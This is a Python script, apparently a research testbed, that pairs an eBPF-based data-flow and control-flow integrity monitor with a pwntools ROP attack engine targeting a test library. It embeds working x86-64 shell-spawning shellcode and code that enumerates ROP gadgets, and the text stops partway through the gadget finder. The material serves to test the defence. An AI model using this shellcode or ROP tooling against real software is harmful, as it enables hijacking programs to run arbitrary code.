#!/usr/bin/env python3
"""
dfi_rop.py - 三层DFI保护 + pwntools式ROP攻击
结合 dfi.py 的DFI监控框架与 ripe_attack_test.c 的攻击方式
使用 pwntools 生成 shellcode / ROP链，针对 test.so 的间接调用站点进行攻击
"""

from bcc import BPF
import ctypes
import os
import re
import sys
import threading
import time
from capstone import Cs, CS_ARCH_X86, CS_MODE_64
import csv
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

if os.geteuid() != 0:
    print("Run with sudo!")
    sys.exit(1)

# ======================== CTypes 结构体 ========================

class CfiEntry(ctypes.Structure):
    _fields_ = [
        ("src_addr", ctypes.c_uint64),
        ("src_func_addr", ctypes.c_uint64),
        ("dst_addr", ctypes.c_uint64),
        ("jump_type", ctypes.c_uint8),
        ("is_indirect", ctypes.c_uint8),
        ("src_func", ctypes.c_char * 64),
        ("dst_func", ctypes.c_char * 64),
        ("opcode", ctypes.c_uint8),
    ]

class JumpEvent(ctypes.Structure):
    _fields_ = [
        ("src_offset", ctypes.c_uint64),
        ("dst_offset", ctypes.c_uint64),
        ("expected_dst", ctypes.c_uint64),
        ("jump_type", ctypes.c_uint8),
        ("is_indirect", ctypes.c_uint8),
        ("is_correct", ctypes.c_uint8),
        ("src_func", ctypes.c_char * 64),
        ("dst_func", ctypes.c_char * 64),
        ("src_addr", ctypes.c_uint64),
        ("src_func_addr", ctypes.c_uint64),
        ("cfi_dst_addr", ctypes.c_uint64),
        ("timestamp_ns", ctypes.c_uint64),
        ("cpu", ctypes.c_uint32),
        ("pid", ctypes.c_uint32),
        ("reg_rax", ctypes.c_uint64),
        ("reg_rcx", ctypes.c_uint64),
        ("reg_rdx", ctypes.c_uint64),
        ("reg_rbx", ctypes.c_uint64),
        ("reg_rsp", ctypes.c_uint64),
        ("reg_rbp", ctypes.c_uint64),
        ("reg_rsi", ctypes.c_uint64),
        ("reg_rdi", ctypes.c_uint64),
        ("insn_bytes", ctypes.c_uint8 * 16),
        ("real_target", ctypes.c_uint64),
        ("insn_len", ctypes.c_uint64),
        ("runtime_ip", ctypes.c_uint64),
        ("module_base_addr", ctypes.c_uint64),
        ("ret_addr", ctypes.c_uint64),
        ("saved_rax_val", ctypes.c_uint64),
        ("saved_rsp_val", ctypes.c_uint64),
    ]

class DfiLayerMeta(ctypes.Structure):
    _fields_ = [
        ("site_id", ctypes.c_uint32),
        ("reg_sel", ctypes.c_uint32),
        ("instr_type", ctypes.c_uint32),
        ("extra", ctypes.c_int32),
        ("instr_len", ctypes.c_uint32),
        ("need_deref", ctypes.c_uint32),
        ("save_target_to_saved_rax", ctypes.c_uint32),
        ("save_target_to_saved_rsp", ctypes.c_uint32),
        ("func_name", ctypes.c_char * 64),
    ]

class DfiLayerEvent(ctypes.Structure):
    _fields_ = [
        ("site_id", ctypes.c_uint32),
        ("layer", ctypes.c_uint32),
        ("reg_value", ctypes.c_uint64),
        ("target_addr", ctypes.c_uint64),
        ("inst_offset", ctypes.c_uint64),
        ("timestamp", ctypes.c_uint64),
        ("pid", ctypes.c_uint32),
        ("cpu", ctypes.c_uint32),
        ("func_name", ctypes.c_char * 64),
    ]

# ======================== 常量定义 ========================

REG_ALIASES = {
    'rax':'rax','eax':'rax','ax':'rax','al':'rax','ah':'rax',
    'rbx':'rbx','ebx':'rbx','bx':'rbx','bl':'rbx','bh':'rbx',
    'rcx':'rcx','ecx':'rcx','cx':'rcx','cl':'rcx','ch':'rcx',
    'rdx':'rdx','edx':'rdx','dx':'rdx','dl':'rdx','dh':'rdx',
    'rsi':'rsi','esi':'rsi','si':'rsi','sil':'rsi',
    'rdi':'rdi','edi':'rdi','di':'rdi','dil':'rdi',
    'rbp':'rbp','ebp':'rbp','bp':'rbp','bpl':'rbp',
    'rsp':'rsp','esp':'rsp','sp':'rsp','spl':'rsp',
    'r8':'r8','r8d':'r8','r8w':'r8','r8b':'r8',
    'r9':'r9','r9d':'r9','r9w':'r9','r9b':'r9',
    'r10':'r10','r10d':'r10','r10w':'r10','r10b':'r10',
    'r11':'r11','r11d':'r11','r11w':'r11','r11b':'r11',
    'r12':'r12','r12d':'r12','r12w':'r12','r12b':'r12',
    'r13':'r13','r13d':'r13','r13w':'r13','r13b':'r13',
    'r14':'r14','r14d':'r14','r14w':'r14','r14b':'r14',
    'r15':'r15','r15d':'r15','r15w':'r15','r15b':'r15',
}

REG_TO_IDX = {
    'rax': 0, 'rcx': 1, 'rdx': 2, 'rbx': 3,
    'rbp': 5, 'rsi': 6, 'rdi': 7, 'r8': 8, 'r9': 9,
    'rsp': 4,
}

# RIPE shellcode (from ripe_attack_test.c)
# 加 sub rsp, 8 修复 x86-64 栈对齐 (call 压栈后 rsp 偏移了 8 字节)
RIPE_SHELLCODE_NONOP = (
    b"\x48\x83\xec\x08"                           # sub rsp, 8  (栈对齐)
    b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48"
    b"\x89\xe7\x48\x31\xd2\x6a\x3b\x58\x0f\x05"
)

RIPE_SHELLCODE_SIMPLENOP = b'\x90' * 32 + RIPE_SHELLCODE_NONOP

# ======================== 指令分类 ========================

def classify_instr(instr_text):
    i = instr_text.strip()
    if re.match(r'^(ret|retq)$', i):
        return (4, 0, 1)
    if re.match(r'^(call|jmp|jmpq|ljmp)\s+\*%[a-z0-9]+', i):
        return (0, 0, 3)
    if re.match(r'^mov\s+\(%[a-z0-9]+\),\s*%[a-z0-9]+', i):
        return (1, 0, 3)
    m = re.match(r'^mov\s+(0x[0-9a-fA-F]+)\(%rip\),\s*%[a-z0-9]+', i)
    if m:
        disp = int(m.group(1), 16)
        return (2, disp, 7)
    m = re.match(r'^mov\s+(-?0x[0-9a-fA-F]+)\(%rbp\),\s*%[a-z0-9]+', i)
    if m:
        disp = int(m.group(1), 16)
        return (3, disp, 4)
    m = re.match(r'^mov\s+-(0x[0-9a-fA-F]+)\(%rbp\),\s*%[a-z0-9]+', i)
    if m:
        disp = -int(m.group(1), 16)
        return (3, disp, 4)
    if re.match(r'^lea\s+', i):
        return (0, 0, 7)
    return (1, 0, 3)

# ======================== DFI 三层链解析 ========================

def parse_df1_layer_chains():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    instr_csv = os.path.join(script_dir, 'register_dfi_instructions.csv')
    du_csv = os.path.join(script_dir, 'register_dfi_def_use_chains.csv')

    instr_map = {}
    func_bases = {}
    reg_based_jumps = []

    with open(instr_csv, 'r', encoding='utf-8-sig') as f:
        reader = csv.DictReader(f)
        for row in reader:
            func = row['function']
            addr = int(row['address'], 16)
            instr_map[(func, addr)] = row
            if func not in func_bases or addr < func_bases[func]:
                func_bases[func] = addr
            if row['indirect_type'] == 'reg_based':
                if row['indirect_call'] == 'Yes' or row['indirect_jump'] == 'Yes':
                    reg_based_jumps.append(row)
            elif row['indirect_type'] == 'ret':
                if row['is_ret'] == 'Yes':
                    reg_based_jumps.append(row)

    du_index = {}
    with open(du_csv, 'r', encoding='utf-8-sig') as f:
        reader = csv.DictReader(f)
        for row in reader:
            reg = row['reg']
            use_func = row['use_func']
            use_addr = int(row['use_addr'], 16)
            def_func = row['def_func']
            def_addr_str = row['def_addr']
            def_addr = int(def_addr_str, 16) if def_addr_str.startswith('0x') else 0
            def_instr = row['def_instr']
            key = (reg, use_func, use_addr)
            if key not in du_index:
                du_index[key] = []
            du_index[key].append({
                'def_func': def_func,
                'def_addr': def_addr,
                'def_instr': def_instr,
            })

    layer_chains = []
    for jump_row in reg_based_jumps:
        func = jump_row['function']
        jump_addr = int(jump_row['address'], 16)
        instr = jump_row['instruction']
        func_base = func_bases.get(func, jump_addr)

        reg_match = re.search(r'\*(%[a-z0-9]+)', instr)
        if not reg_match:
            if re.match(r'^(ret|retq)$', instr.strip()):
                reg_name = 'rsp'
            else:
                continue
        else:
            reg_name_raw = reg_match.group(1).lstrip('%')
            reg_name = REG_ALIASES.get(reg_name_raw, reg_name_raw)

        chain_key = (reg_name, func, jump_addr)
        def_entries = du_index.get(chain_key, [])
        def_entries.sort(key=lambda x: x['def_addr'], reverse=True)

        seen_addr = set()
        unique_defs = []
        for d in def_entries:
            if d['def_addr'] not in seen_addr and d['def_addr'] != 0:
                seen_addr.add(d['def_addr'])
                unique_defs.append(d)

        layers = []
        t1, e1, l1 = classify_instr(instr)
        layers.append({
            'level': 1,
            'def_addr': jump_addr,
            'offset': jump_addr - func_base,
            'instr': instr,
            'instr_type': t1,
            'extra': e1,
            'instr_len': l1,
        })
        for i, d in enumerate(unique_defs[:2]):
            t, e, il = classify_instr(d['def_instr'])
            layers.append({
                'level': i + 2,
                'def_addr': d['def_addr'],
                'offset': d['def_addr'] - func_base,
                'instr': d['def_instr'],
                'instr_type': t,
                'extra': e,
                'instr_len': il,
            })
        while len(layers) < 3:
            last = layers[-1].copy()
            last['level'] = len(layers) + 1
            layers.append(last)

        has_deref = any(l['instr_type'] == 1 for l in layers)
        for l in layers:
            if l['instr_type'] in (2, 3):
                l['need_deref'] = 1 if has_deref else 0
            else:
                l['need_deref'] = 0

        chain = {
            'func': func,
            'func_base': func_base,
            'jump_addr': jump_addr,
            'reg': reg_name,
            'instr': instr,
            'layers': layers,
        }
        layer_chains.append(chain)

    return layer_chains, func_bases

# ======================== CFI 表解析 ========================

def parse_cfi_table(file_path):
    table = []
    with open(file_path, 'r', newline='', encoding='utf-8') as f:
        reader = csv.DictReader(f)
        for row in reader:
            def to_offset(s):
                return int(s, 16) if s and s != "UNKNOWN" else 0
            src_addr = to_offset(row['jump_instr_address'])
            src_func_addr = to_offset(row['parent_function_start'])
            dst_addr = to_offset(row['target_address'])
            instr_len = int(row.get('instr_len', 0)) if row.get('instr_len') else 0
            instr_content = row.get('instr_content', '').strip()
            instr_bytes = row.get('instr_bytes', '').strip()
            jump_instr = row.get('jump_instr', '').strip()

            if jump_instr in ['callq', 'call']:
                jump_type = 2
            elif jump_instr == 'jmp':
                jump_type = 0
            elif jump_instr in ['ret', 'retq']:
                jump_type = 3
            else:
                jump_type = 1

            is_indirect = 1 if '*' in instr_content else 0
            if is_indirect:
                if jump_type == 2: jump_type = 4
                elif jump_type == 0: jump_type = 5

            src_func = row.get('parent_function_name', 'unknown').encode('utf-8')[:63]
            dst_func = row.get('target_function_name', 'unknown').encode('utf-8')[:63]

            opcode = 0
            if instr_bytes and instr_bytes != '未知':
                opcode = int(instr_bytes.split()[0], 16)

            table.append({
                'src_addr': src_addr,
                'src_func_addr': src_func_addr,
                'dst_addr': dst_addr,
                'jump_type': jump_type,
                'is_indirect': is_indirect,
                'src_func': src_func,
                'dst_func': dst_func,
                'instr_len': instr_len,
                'instr_content': instr_content,
                'instr_bytes': instr_bytes,
                'opcode': opcode,
            })
    print(f" 从 CSV 成功解析 {len(table)} 个静态跳转规则")
    return table


# ======================== 合法目标集构建 ========================

def extract_call_target_from_disasm(instr_content):
    m = re.match(r'(?:call|jmp)\s+(0x[0-9a-fA-F]+)\s*<([^>]+)>', instr_content)
    if m:
        target_addr = int(m.group(1), 16)
        symbol_name = m.group(2).strip()
        if symbol_name.endswith('@plt'):
            symbol_name = symbol_name[:-4]
        return target_addr, symbol_name
    return None, None


def build_legitimate_target_sets(cfi_table):
    """为每个间接跳转点构建合法目标集合
    - INDIRECT_CALL/INDIRECT_JMP (type 4,5): 合法目标 = 所有函数入口
    - RET (type 3): 合法目标 = 调用该函数的 call 下一条指令
    """
    # 收集所有函数入口 + 建立符号名 -> 函数入口映射
    func_heads = set()
    symbol_to_head = {}
    for entry in cfi_table:
        head = entry['src_func_addr']
        if head != 0:
            func_heads.add(head)
        func_name = entry['src_func'].decode('utf-8', errors='ignore').split('\x00')[0].strip()
        if func_name and head not in symbol_to_head:
            symbol_to_head[func_name] = head

    # 构建 call graph: 实际函数入口 -> [(call_src_addr, call_instr_len)]
    call_graph = {}
    for entry in cfi_table:
        if entry['jump_type'] in (2, 0) and entry['is_indirect'] == 0:
            target_addr, symbol = extract_call_target_from_disasm(entry['instr_content'])
            if target_addr and symbol:
                resolved_head = symbol_to_head.get(symbol, 0)
                if resolved_head == 0:
                    resolved_head = target_addr
                if resolved_head not in call_graph:
                    call_graph[resolved_head] = []
                call_graph[resolved_head].append((entry['src_addr'], entry['instr_len']))

    # 构建每个间接点的合法目标集
    legitimate_sets = {}
    for entry in cfi_table:
        src = entry['src_addr']
        jtype = entry['jump_type']

        if jtype in (4, 5):
            legitimate_sets[src] = {
                'type': 'func_heads',
                'targets': func_heads.copy(),
            }
        elif jtype == 3:
            func_start = entry['src_func_addr']
            ret_targets = set()
            for call_src, call_len in call_graph.get(func_start, []):
                ret_targets.add(call_src + call_len)
            legitimate_sets[src] = {
                'type': 'ret_addrs',
                'targets': ret_targets,
            }

    # 统计信息
    indirect_count = sum(1 for v in legitimate_sets.values() if v['type'] == 'func_heads')
    ret_count = sum(1 for v in legitimate_sets.values() if v['type'] == 'ret_addrs')
    print(f" 间接跳转站点: {indirect_count} 个 (合法目标集=所有函数入口)")
    print(f" 返回站点:       {ret_count} 个 (合法目标=call下一条指令)")
    return legitimate_sets, func_heads

# ======================== BPF 程序 ========================

def get_bpf_text():
    return """
#include <uapi/linux/ptrace.h>

struct cfi_entry {
    u64 src_addr;
    u64 src_func_addr;
    u64 dst_addr;
    u8 jump_type;
    u8 is_indirect;
    char src_func[64];
    char dst_func[64];
    u8 opcode;
};

struct jump_event {
    u64 src_offset;
    u64 dst_offset;
    u64 expected_dst;
    u8 jump_type;
    u8 is_indirect;
    u8 is_correct;
    char src_func[64];
    char dst_func[64];
    u64 src_addr;
    u64 src_func_addr;
    u64 cfi_dst_addr;
    u64 timestamp_ns;
    u32 cpu;
    u32 pid;
    u64 reg_rax;
    u64 reg_rcx;
    u64 reg_rdx;
    u64 reg_rbx;
    u64 reg_rsp;
    u64 reg_rbp;
    u64 reg_rsi;
    u64 reg_rdi;
    u8 insn_bytes[16];
    u64 real_target;
    u8 insn_len;
    u64 runtime_ip;
    u64 module_base_addr;
    u64 ret_addr;
    u64 saved_rax_val;
    u64 saved_rsp_val;
};

BPF_HASH(cfi_map, u64, struct cfi_entry);
BPF_HASH(module_base, u64, u64);
BPF_PERF_OUTPUT(jump_events);
BPF_HASH(saved_rax, u32, u64);
BPF_HASH(saved_rsp, u64, u64);
BPF_HASH(ret_depth, u32, u32);
BPF_HASH(func_heads, u64, u32);
BPF_HASH(ret_targets, u64, u32);

struct dfi_layer_meta {
    u32 site_id;
    u32 reg_sel;
    u32 instr_type;
    s32 extra;
    u32 instr_len;
    u32 need_deref;
    u32 save_target_to_saved_rax;
    u32 save_target_to_saved_rsp;
    char func_name[64];
};

struct dfi_layer_event_t {
    u32 site_id;
    u32 layer;
    u64 reg_value;
    u64 target_addr;
    u64 inst_offset;
    u64 timestamp;
    u32 pid;
    u32 cpu;
    char func_name[64];
};

BPF_HASH(dfi_l1_cfg, u64, struct dfi_layer_meta);
BPF_HASH(dfi_l2_cfg, u64, struct dfi_layer_meta);
BPF_HASH(dfi_l3_cfg, u64, struct dfi_layer_meta);
BPF_HASH(dfi_layer_vals, u64, u64);
BPF_PERF_OUTPUT(dfi_layer_events);

static inline int dfi_do_probe(struct pt_regs *ctx, u32 layer,
                                struct dfi_layer_meta *meta, u64 offset) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u64 ip = PT_REGS_IP(ctx);
    u64 reg_val = 0;
    u64 target = 0;

    switch (meta->instr_type) {
    case 0:
        {
            u64 tmp = 0;
            if (meta->reg_sel == 0) bpf_probe_read(&tmp, sizeof(tmp), &ctx->ax);
            else if (meta->reg_sel == 1) bpf_probe_read(&tmp, sizeof(tmp), &ctx->cx);
            else if (meta->reg_sel == 2) bpf_probe_read(&tmp, sizeof(tmp), &ctx->dx);
            else if (meta->reg_sel == 3) bpf_probe_read(&tmp, sizeof(tmp), &ctx->bx);
            else if (meta->reg_sel == 4) bpf_probe_read(&tmp, sizeof(tmp), &ctx->sp);
            else if (meta->reg_sel == 5) bpf_probe_read(&tmp, sizeof(tmp), &ctx->bp);
            else if (meta->reg_sel == 6) bpf_probe_read(&tmp, sizeof(tmp), &ctx->si);
            else if (meta->reg_sel == 7) bpf_probe_read(&tmp, sizeof(tmp), &ctx->di);
            else if (meta->reg_sel == 8) bpf_probe_read(&tmp, sizeof(tmp), &ctx->r8);
            else if (meta->reg_sel == 9) bpf_probe_read(&tmp, sizeof(tmp), &ctx->r9);
            reg_val = tmp;
            target = tmp;
        }
        break;

    case 1:
        {
            u64 tmp = 0;
            if (meta->reg_sel == 0) bpf_probe_read(&tmp, sizeof(tmp), &ctx->ax);
            else if (meta->reg_sel == 1) bpf_probe_read(&tmp, sizeof(tmp), &ctx->cx);
            else if (meta->reg_sel == 2) bpf_probe_read(&tmp, sizeof(tmp), &ctx->dx);
            else if (meta->reg_sel == 3) bpf_probe_read(&tmp, sizeof(tmp), &ctx->bx);
            else if (meta->reg_sel == 4) bpf_probe_read(&tmp, sizeof(tmp), &ctx->sp);
            else if (meta->reg_sel == 5) bpf_probe_read(&tmp, sizeof(tmp), &ctx->bp);
            else if (meta->reg_sel == 6) bpf_probe_read(&tmp, sizeof(tmp), &ctx->si);
            else if (meta->reg_sel == 7) bpf_probe_read(&tmp, sizeof(tmp), &ctx->di);
            else if (meta->reg_sel == 8) bpf_probe_read(&tmp, sizeof(tmp), &ctx->r8);
            else if (meta->reg_sel == 9) bpf_probe_read(&tmp, sizeof(tmp), &ctx->r9);
            reg_val = tmp;
            if (reg_val != 0)
                bpf_probe_read_user(&target, sizeof(target), (void *)reg_val);
        }
        break;

    case 2:
        {
            u64 ptr_addr = ip + meta->instr_len + (s64)meta->extra;
            if (bpf_probe_read_user(&reg_val, sizeof(reg_val), (void *)ptr_addr) == 0) {
                if (reg_val != 0 && meta->need_deref)
                    bpf_probe_read_user(&target, sizeof(target), (void *)reg_val);
                else
                    target = reg_val;
            }
        }
        break;

    case 3:
        {
            u64 rbp_val = 0;
            bpf_probe_read(&rbp_val, sizeof(rbp_val), &ctx->bp);
            u64 ptr_addr = rbp_val + (s64)meta->extra;
            if (bpf_probe_read_user(&reg_val, sizeof(reg_val), (void *)ptr_addr) == 0) {
                if (reg_val != 0 && meta->need_deref)
                    bpf_probe_read_user(&target, sizeof(target), (void *)reg_val);
                else
                    target = reg_val;
            }
        }
        break;

    case 4:
        {
            u64 rsp_val = 0;
            bpf_probe_read(&rsp_val, sizeof(rsp_val), &ctx->sp);
            if (bpf_probe_read_user(&reg_val, sizeof(reg_val), (void *)rsp_val) == 0) {
                target = reg_val;
            }
        }
        break;
    }

    if (target != 0 && meta->instr_type != 4) {
        u64 _z = 0;
        u64 *_mb = module_base.lookup(&_z);
        if (_mb) {
            u64 target_offset = target - *_mb;
            u32 *head = func_heads.lookup(&target_offset);
            if (!head) {
                bpf_send_signal(9);
                return 0;
            }
        }
    }

    if (target != 0 && meta->instr_type == 4) {
        u64 _z = 0;
        u64 *_mb = module_base.lookup(&_z);
        if (_mb) {
            u64 target_offset = target - *_mb;
            u32 *head = ret_targets.lookup(&target_offset);
            if (!head) {
                bpf_send_signal(9);
                return 0;
            }
        }
    }

    u64 key = ((u64)pid << 32) | ((u64)meta->site_id << 8) | layer;
    dfi_layer_vals.update(&key, &reg_val);

    if (meta->save_target_to_saved_rax && layer == 2 && target != 0) {
        saved_rax.update(&pid, &target);
    }

    struct dfi_layer_event_t evt = {};
    evt.site_id = meta->site_id;
    evt.layer = layer;
    evt.reg_value = reg_val;
    evt.target_addr = target;
    evt.inst_offset = offset;
    evt.timestamp = bpf_ktime_get_ns();
    evt.pid = pid;
    evt.cpu = bpf_get_smp_processor_id();
    bpf_probe_read(evt.func_name, sizeof(evt.func_name), meta->func_name);
    dfi_layer_events.perf_submit(ctx, &evt, sizeof(evt));
    return 0;
}

int trace_ret_target(struct pt_regs *ctx) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u32 *dp = ret_depth.lookup(&pid);
    u32 depth = dp ? (*dp + 1) : 1;
    ret_depth.update(&pid, &depth);
    u64 rsp;
    bpf_probe_read(&rsp, sizeof(rsp), &ctx->sp);
    u64 ret_addr = 0;
    bpf_probe_read_user(&ret_addr, sizeof(ret_addr), (void *)rsp);
    u64 key = ((u64)pid << 32) | depth;
    saved_rsp.update(&key, &ret_addr);
    return 0;
}

int trace_df1_l1(struct pt_regs *ctx) {
    u64 ip = PT_REGS_IP(ctx);
    u64 zero = 0;
    u64 *bp = module_base.lookup(&zero);
    if (!bp) return 0;
    u64 offset = ip - *bp;
    struct dfi_layer_meta *meta = dfi_l1_cfg.lookup(&offset);
    if (!meta) return 0;
    return dfi_do_probe(ctx, 1, meta, offset);
}

int trace_df1_l2(struct pt_regs *ctx) {
    u64 ip = PT_REGS_IP(ctx);
    u64 zero = 0;
    u64 *bp = module_base.lookup(&zero);
    if (!bp) return 0;
    u64 offset = ip - *bp;
    struct dfi_layer_meta *meta = dfi_l2_cfg.lookup(&offset);
    if (!meta) return 0;
    return dfi_do_probe(ctx, 2, meta, offset);
}

int trace_df1_l3(struct pt_regs *ctx) {
    u64 ip = PT_REGS_IP(ctx);
    u64 zero = 0;
    u64 *bp = module_base.lookup(&zero);
    if (!bp) return 0;
    u64 offset = ip - *bp;
    struct dfi_layer_meta *meta = dfi_l3_cfg.lookup(&offset);
    if (!meta) return 0;
    return dfi_do_probe(ctx, 3, meta, offset);
}

int trace_rax(struct pt_regs *ctx) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u64 rax;
    bpf_probe_read(&rax, sizeof(rax), &ctx->ax);
    u64 target;
    if (bpf_probe_read_user(&target, sizeof(target), (void *)rax) == 0) {
        saved_rax.update(&pid, &target);
    } else {
        u64 zero = 0;
        saved_rax.update(&pid, &zero);
    }
    return 0;
}

int trace_all_jumps(struct pt_regs *ctx) {
    u64 key = 0;
    u64 *base_ptr = module_base.lookup(&key);
    if (!base_ptr) return 0;
    u64 base = *base_ptr;

    u64 ip = PT_REGS_IP(ctx);
    if (ip < base) return 0;

    u64 offset = ip - base;

    struct cfi_entry *entry = cfi_map.lookup(&offset);
    if (!entry) return 0;

    struct jump_event event = {};
    event.runtime_ip = ip;
    event.module_base_addr = base;
    event.src_offset = offset;
    event.src_addr = entry->src_addr;
    event.cfi_dst_addr = entry->dst_addr;
    event.jump_type = entry->jump_type;
    event.is_indirect = entry->is_indirect;
    event.timestamp_ns = bpf_ktime_get_ns();
    event.cpu = bpf_get_smp_processor_id();
    event.pid = bpf_get_current_pid_tgid() >> 32;
    bpf_probe_read(&event.reg_rax, sizeof(event.reg_rax), &ctx->ax);
    bpf_probe_read(&event.reg_rcx, sizeof(event.reg_rcx), &ctx->cx);
    bpf_probe_read(&event.reg_rdx, sizeof(event.reg_rdx), &ctx->dx);
    bpf_probe_read(&event.reg_rbx, sizeof(event.reg_rbx), &ctx->bx);
    bpf_probe_read(&event.reg_rsp, sizeof(event.reg_rsp), &ctx->sp);
    bpf_probe_read(&event.reg_rbp, sizeof(event.reg_rbp), &ctx->bp);
    bpf_probe_read(&event.reg_rsi, sizeof(event.reg_rsi), &ctx->si);
    bpf_probe_read(&event.reg_rdi, sizeof(event.reg_rdi), &ctx->di);

    bpf_probe_read(event.insn_bytes, 16, (void*)ip);
    bpf_probe_read(event.src_func, 64, entry->src_func);
    bpf_probe_read(event.dst_func, 64, entry->dst_func);

    u64 *saved = saved_rax.lookup(&event.pid);
    if (saved) {
        event.saved_rax_val = *saved;
        if (*saved == event.reg_rax) {
            event.is_correct = 1;
        } else {
            event.is_correct = 0;
        }
    } else {
        event.saved_rax_val = 0;
    }

    if (entry->jump_type == 3) {
        u32 pid = event.pid;
        u64 sp;
        bpf_probe_read(&sp, sizeof(sp), &ctx->sp);
        bpf_probe_read(&event.ret_addr, sizeof(event.ret_addr), (void *)sp);

        u32 *dp = ret_depth.lookup(&pid);
        u32 depth = dp ? *dp : 0;
        u64 key = ((u64)pid << 32) | depth;
        u64 *saved = saved_rsp.lookup(&key);

        if (saved && *saved != 0) {
            event.saved_rsp_val = *saved;
            if (*saved == event.ret_addr) {
                event.is_correct = 1;
            } else {
                event.is_correct = 0;
            }
        } else {
            event.saved_rsp_val = 0;
        }

        if (depth > 0) {
            depth--;
            ret_depth.update(&pid, &depth);
        }
    }

    if (entry->jump_type == 4 || entry->jump_type == 5) {
        u64 target_offset = event.reg_rax - base;
        u32 *head = func_heads.lookup(&target_offset);
        if (!head) {
            event.is_correct = 0;
        }
    }

    
    jump_events.perf_submit(ctx, &event, sizeof(event));

    

    return 0;
}
"""

# ======================== 事件处理器 ========================

def handle_jump_event(cpu, data, size):
    global event_count, violation_count, base, cfi_lookup, attack_triggered, legitimate_sets
    event = b["jump_events"].event(data)

    jump_type_names = {
        0: "JMP", 1: "JCC", 2: "CALL", 3: "RET",
        4: "INDIRECT_CALL", 5: "INDIRECT_JMP"
    }
    jump_type_name = jump_type_names.get(event.jump_type, f"UNKNOWN({event.jump_type})")

    if not event.is_correct:
        violation_count += 1

    src_func_str = event.src_func.decode('utf-8', errors='ignore').split('\x00')[0].strip()
    dst_func_str = event.dst_func.decode('utf-8', errors='ignore').split('\x00')[0].strip()

    src_addr_key = event.src_addr
    cfi_info = cfi_lookup.get(src_addr_key, {})
    instr_len = cfi_info.get('instr_len', 0)
    instr_content = cfi_info.get('instr_content', '?')
    instr_bytes = cfi_info.get('instr_bytes', '?')
    csv_opcode = cfi_info.get('opcode', 0)

    target_set_info = legitimate_sets.get(src_addr_key, None)
    is_legitimate = None
    actual_target = None
    actual_offset = None
    if event.jump_type in (4, 5):
        actual_target = event.reg_rax
    elif event.jump_type == 3:
        actual_target = event.ret_addr

    if actual_target:
        actual_offset = actual_target - base if actual_target >= base else actual_target

    if actual_offset is not None and target_set_info:
        allowed = target_set_info['targets']
        if allowed:
            if actual_offset in allowed:
                is_legitimate = True
            else:
                is_legitimate = False

    print("\n" + "=" * 80)
    print(f"[CFI] 事件 #{event_count + 1}")
    legit_str = ""
    if is_legitimate is not None:
        legit_str = f" | 合法目标集: {'OK' if is_legitimate else 'VIOLATION'}"
    print(f"  类型: {jump_type_name} | {'VIOLATION' if not event.is_correct else 'OK'}{legit_str}")
    print(f"  源函数: {src_func_str} -> 目标函数: {dst_func_str}")
    print(f"  源偏移: 0x{event.src_offset:x}  RAX: 0x{event.reg_rax:x}")
    print(f"  CFI预期目标: 0x{event.cfi_dst_addr:x}")
    print(f"  saved_rax: 0x{event.saved_rax_val:x}")

    if target_set_info:
        ttype = target_set_info['type']
        allowed = target_set_info['targets']
        if ttype == 'func_heads':
            print(f"  合法目标集: 函数入口 ({len(allowed)} 个)")
            if actual_target and actual_offset is not None:
                in_set = actual_offset in allowed
                print(f"  实际目标 0x{actual_target:x} (偏移 0x{actual_offset:x}) -> {'合法' if in_set else '非法'}")
                if not in_set:
                    print(f"  [!] 目标不在函数入口集合中 -> 可能为攻击")
                    attack_triggered = True
                    print(f"  [!!!] 终止进程!")
                    #os._exit(1)
        elif ttype == 'ret_addrs':
            print(f"  合法目标集: call下一条指令 ({len(allowed)} 个)")
            if actual_target and actual_offset is not None:
                in_set = actual_offset in allowed
                print(f"  返回地址 0x{actual_target:x} (偏移 0x{actual_offset:x}) -> {'合法' if in_set else '非法'}")
                if not in_set and len(allowed) > 0:
                    print(f"  [!] 返回地址不在合法集合中 -> 可能为ROP")
                    attack_triggered = True
                    print(f"  [!!!] 终止进程!")
                    #os._exit(1)

    if event.jump_type in (4, 5):
        actual_target = event.reg_rax
        expected = event.cfi_dst_addr
        if actual_target != expected and expected != 0:
            delta = actual_target - base if actual_target >= base else actual_target
            print(f"  [!] ROP ATTACK DETECTED: 间接跳转目标被劫持!")
            print(f"      实际: 0x{actual_target:x}  预期: 0x{expected:x}")
            print(f"      劫持目标偏移: 0x{delta:x}")
            attack_triggered = True
            print(f"  [!!!] 终止进程!")
            #os._exit(1)

    print("=" * 80)
    event_count += 1

def handle_df1_layer_event(cpu, data, size):
    global layer_event_count
    event = b["dfi_layer_events"].event(data)
    func_name = event.func_name.decode('utf-8', errors='ignore').split('\x00')[0].strip()

    layer_label = {1: "L1(jump target)", 2: "L2(deref ptr)", 3: "L3(ptr load)"}
    label = layer_label.get(event.layer, f"L{event.layer}")

    print(f"\n[DFI] {label} site=#{event.site_id} func={func_name}")
    print(f"  offset=0x{event.inst_offset:x}  reg_val=0x{event.reg_value:x}  target=0x{event.target_addr:x}")
    layer_event_count += 1

# ======================== 辅助函数 ========================

def get_module_base_from_maps(so_name):
    with open('/proc/self/maps', 'r') as f:
        for line in f:
            if so_name in line:
                start_addr = int(line.split('-')[0], 16)
                return start_addr
    return None

# ======================== pwntools 式 ROP 攻击引擎 ========================

class ROPAttackEngine:
    """使用 pwntools 风格的 ROP 攻击引擎，参考 ripe_attack_test.c"""

    def __init__(self, so_path, base_addr):
        self.so_path = so_path
        self.base = base_addr
        self.elf = ELF(so_path, checksec=False)
        log.info(f"Loaded ELF: {so_path}")
        log.info(f"  Base: 0x{self.base:x}")
        log.info(f"  Arch: {self.elf.arch}  Bits: {self.elf.bits}")

    def find_rop_gadgets(self):
        """查找 test.so 中的 ROP gadgets"""
        gadgets = {}
        try:
            rop = ROP(self.elf)
            log.info(f"Found {len(rop.gadgets)} ROP gadgets")

            for addr, gadget in rop.gadgets.items():
                insns_str = ' ; '.join(gadget.insns)
                if len(gadget.insns) <= 4:
                    gadgets[self.base + addr - self.elf.address] = insns_str

            for name in ['pop rdi', 'pop rsi', 'pop rdx', 'ret',
                         'pop rax', 'syscall', 'pop rcx']:
                found = [hex(a) for a, g in gadgets.items() if name in g]
                if found:
                    log.info(f"  {name}: {found[:3]}")
                else:
                    log.warning(f"  {name}: not found")

        except Exception as e:
